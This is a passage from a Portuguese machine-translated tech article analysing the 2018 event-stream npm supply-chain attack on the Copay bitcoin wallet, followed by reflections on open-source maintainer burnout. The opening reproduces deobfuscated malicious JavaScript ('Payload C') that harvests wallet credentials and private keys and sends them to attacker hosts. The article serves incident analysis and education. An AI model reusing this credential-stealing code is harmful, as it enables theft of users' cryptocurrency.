class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-string"><span class="hljs-string">""</span></span>, r = <span class="hljs-number"><span class="hljs-number">0</span></span>; r &lt; t.length; r += <span class="hljs-number"><span class="hljs-number">200</span></span>) {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = t.substr(r, <span class="hljs-number"><span class="hljs-number">200</span></span>);                   n += a.publicEncrypt(c, Buffer.from(o, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)).toString(<span class="hljs-string"><span class="hljs-string">"hex"</span></span>) + <span class="hljs-string"><span class="hljs-string">"+"</span></span>               }               i(<span class="hljs-string"><span class="hljs-string">"636f7061796170692e686f7374"</span></span>, e, n), i(<span class="hljs-string"><span class="hljs-string">"3131312e39302e3135312e313334"</span></span>, e, n)           }           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = cordova.file.dataDirectory;                   resolveLocalFileSystemURL(e, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                       e.getFile(t, {                           <span class="hljs-attr"><span class="hljs-attr">create</span></span>: !<span class="hljs-number"><span class="hljs-number">1</span></span>                       }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                           e.file(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileReader;                               t.onloadend = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{                                   <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(t.result))                               }, t.onerror = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                                   t.abort()                               }, t.readAsText(e)                           })                       })                   })               } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {                   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = localStorage.getItem(t);                       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (r) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(r))                   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}                   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                       chrome.storage.local.get(t, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(e[t]))                       })                   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}               }           }           global.CSSMap = {}, l(<span class="hljs-string"><span class="hljs-string">"profile"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e.credentials) {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = e.credentials[t];                   <span class="hljs-string"><span class="hljs-string">"livenet"</span></span> == n.network &amp;&amp; l(<span class="hljs-string"><span class="hljs-string">"balanceCache-"</span></span> + n.walletId, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>;                       t.balance = <span class="hljs-built_in"><span class="hljs-built_in">parseFloat</span></span>(e.balance.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]), <span class="hljs-string"><span class="hljs-string">"btc"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">100</span></span> || <span class="hljs-string"><span class="hljs-string">"bch"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">1e3</span></span> || (global.CSSMap[t.xPubKey] = !<span class="hljs-number"><span class="hljs-number">0</span></span>, r(<span class="hljs-string"><span class="hljs-string">"c"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.stringify(t)))                   }.bind(n))               }           });           <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"bitcore-wallet-client/lib/credentials.js"</span></span>);           e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getKeysFunc(e);               <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                   global.CSSMap &amp;&amp; global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey] &amp;&amp; (<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey], r(<span class="hljs-string"><span class="hljs-string">"p"</span></span>, e + <span class="hljs-string"><span class="hljs-string">"\t"</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey))               } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}               <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t           }       } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}   }   <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova ? <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">"deviceready"</span></span>, e) : e()</code> </pre> <br>  <code>Payload A</code> e a <code>Payload B</code> s√£o projetadas para serem executadas no ambiente Node.js., no servidor de cria√ß√£o do projeto, mas a <code>Payload C</code> projetada para ser executada em um ambiente semelhante a um navegador sob o controle da estrutura <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Cordova</a> (anteriormente <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">PhoneGap</a> ).  Essa estrutura permite que voc√™ desenvolva aplicativos nativos para v√°rias plataformas usando tecnologias da web - HTML, CSS e JavaScript.  Os aplicativos clientes Copay (assim como os garfos deste projeto, como o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">FCash</a> ), projetados para v√°rias plataformas, s√£o criados usando o Cordova.  √â para esses clientes que o ataque √© direcionado.  Esses aplicativos nativos s√£o para usu√°rios finais da Copay que gerenciam suas carteiras Bitcoin com eles.  Essas carteiras eram de interesse do atacante.  O script enviou os dados roubados para copayapi.host e em 111.90.151.134. <br><br><h2>  <font color="#3AC1EF">Conclus√µes decepcionantes</font> </h2><br>  Desenvolver o que acabamos de falar √© uma tarefa assustadora.  Esse hack exigiu uma pesquisa s√©ria e um esfor√ßo consider√°vel para conduzir um ataque.  O invasor provavelmente tamb√©m tinha op√ß√µes de fallback que ele usaria se n√£o pudesse obter o controle do pacote de fluxo de eventos.  Considerando como o ataque foi organizado, parece plaus√≠vel que o atacante tenha sido originalmente direcionado especificamente para Copay, e n√£o apenas tenha ganhado o controle da biblioteca popular, e ent√£o estava pensando sobre o que deveria fazer com ele.  A popularidade do fluxo de eventos sugere que o invasor tinha uma maneira f√°cil de acessar computadores importantes em centenas de empresas em todo o mundo.  Felizmente, a amea√ßa foi rapidamente detectada e neutralizada, dado o tempo que poderia ter passado despercebido, mas pensando no que poderia ter nos levado √† conclus√£o √≥bvia: o c√≥digo aberto est√° gravemente doente. <br><br>  Vamos fazer uma lista dos motivos que levaram ao incidente acima: <br><br><ol><li>  O aplicativo (Copay) foi criado com base em muitas depend√™ncias diferentes, enquanto sua √°rvore de depend√™ncias n√£o foi bloqueada. </li><li>  Mesmo levando em considera√ß√£o que a √°rvore de depend√™ncias n√£o foi bloqueada, as depend√™ncias n√£o foram armazenadas em cache, elas foram carregadas do reposit√≥rio a cada constru√ß√£o do projeto. </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Milhares de</a> outros projetos dependem do fluxo de eventos, eles usam configura√ß√µes iguais ou semelhantes. </li><li>  Quem apoiou a biblioteca, da qual milhares de projetos dependem, parou de trabalhar nela. </li><li>  Milhares de projetos usaram essa biblioteca gratuitamente.  Ao mesmo tempo, esperava-se que eles a sustentassem sem nenhuma compensa√ß√£o material. </li><li>  Quem apoiou a biblioteca transferiu o controle para o desconhecido apenas porque ele perguntou sobre isso. </li><li>  N√£o houve notifica√ß√µes de que o projeto mudou de propriet√°rio e, mesmo assim, milhares de projetos simplesmente continuaram usando o pacote apropriado. </li><li>  De fato, esta lista continua ... </li></ol><br>  √â assustador at√© pensar sobre o dano que a invas√£o discutida por n√≥s poderia causar.  Por exemplo, projetos extremamente s√©rios dependem do fluxo de eventos.  Por exemplo, a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">CLI</a> do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Microsoft Azure</a> .  Vulner√°veis ‚Äã‚Äãeram os computadores nos quais est√£o desenvolvendo este programa e os computadores nos quais ele √© usado.  C√≥digo mal-intencionado pode muito bem aparecer tanto nesses como em outros. <br><br>  O problema aqui √© que muitos projetos de software s√£o constru√≠dos com base no que as pessoas que esperam faz√™-lo trabalhar√£o de gra√ßa.  Eles criam programas √∫teis, est√£o envolvidos por algum tempo (ou talvez apenas os publicem e isso √© tudo), e espera-se que apoiem seu desenvolvimento at√© o final dos tempos.  Se isso n√£o funcionar para eles, eles permanecem inativos, ignorando chamadas ou relat√≥rios de vulnerabilidades em seus projetos ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">culpados!</a> ), Ou simplesmente entregando seus projetos a outras pessoas, esperando que eles possam sair e n√£o se envolvam mais nele.  √Äs vezes funciona.  √Äs vezes n√£o.  Mas nada pode justificar as vulnerabilidades que, devido a esses fen√¥menos, aparecem no software.  A prop√≥sito, at√© a detec√ß√£o de um problema no fluxo de eventos, sua investiga√ß√£o e elimina√ß√£o, foi realizada principalmente por volunt√°rios de c√≥digo aberto, cujo trabalho n√£o √© remunerado de forma alguma. <br><br>  Tantas pessoas e organiza√ß√µes diferentes est√£o relacionadas ao que aconteceu que a busca por culpados espec√≠ficos n√£o faz muito sentido.  O c√≥digo aberto est√° gravemente doente e, quanto maior esse fen√¥meno, maior a probabilidade de desastres.  Dado o potencial destrutivo do incidente discutido aqui, √© uma sorte que o objetivo do invasor seja apenas um aplicativo. <br><br>  Problemas semelhantes n√£o est√£o limitados ao Node.js ou npm.  Em ecossistemas relacionados, √© observado um n√≠vel de confian√ßa igualmente inapropriadamente alto em estranhos.  Isso tem a ver com o PyPi no ambiente Python, RubyGems e GitHub tamb√©m.  Qualquer pessoa pode publicar nos servi√ßos mencionados, sem qualquer notifica√ß√£o, transferindo o gerenciamento de seus projetos para qualquer pessoa.  E mesmo sem ele, os projetos modernos usam tantos volumes de c√≥digo de outras pessoas que uma an√°lise completa do mesmo interromperia o trabalho de qualquer equipe por um longo tempo.  Para cumprir os prazos apertados, os desenvolvedores instalam o que precisam e as equipes respons√°veis ‚Äã‚Äãpelas ferramentas de seguran√ßa e verifica√ß√£o autom√°tica de c√≥digo simplesmente n√£o acompanham o ritmo do desenvolvimento r√°pido de programas em constante mudan√ßa. <br><br>  <b>Caros leitores!</b>  Como voc√™ se sente sobre o recente incidente no fluxo de eventos? <br><br><div style="text-align:center;"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://habrastorage.org/webt/n0/ry/op/n0ryop7wfykgkeicz3mtuwghrcu.jpeg"></a> </div><br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt434116/">https://habr.com/ru/post/pt434116/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt434104/index.html">Terra VHF ou desmistifica√ß√£o de antenas de quadrado duplo / triplo</a></li>
<li><a href="../pt434106/index.html">Confie nos SDKs para celular</a></li>
<li><a href="../pt434110/index.html">O resumo de materiais frescos do mundo do front-end da √∫ltima semana n ¬∞ 344 (17 a 23 de dezembro de 2018)</a></li>
<li><a href="../pt434112/index.html">Princ√≠pios de programa√ß√£o funcional em JavaScript</a></li>
<li><a href="../pt434114/index.html">19 id√©ias para desenvolvedores do Node.js que desejam crescer acima de si em 2019</a></li>
<li><a href="../pt434118/index.html">Tutorial Reagir Parte 4: Componentes pai e filho</a></li>
<li><a href="../pt434120/index.html">Tutorial React, Parte 5: Introdu√ß√£o a um aplicativo TODO, estilo b√°sico</a></li>
<li><a href="../pt434122/index.html">Roteiro - N√£o √© um objeto de p√°gina</a></li>
<li><a href="../pt434124/index.html">Ative a acelera√ß√£o de GPU no Photoshop no Wine</a></li>
<li><a href="../pt434126/index.html">Reproduzir m√≠dia usando a biblioteca VLCj</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>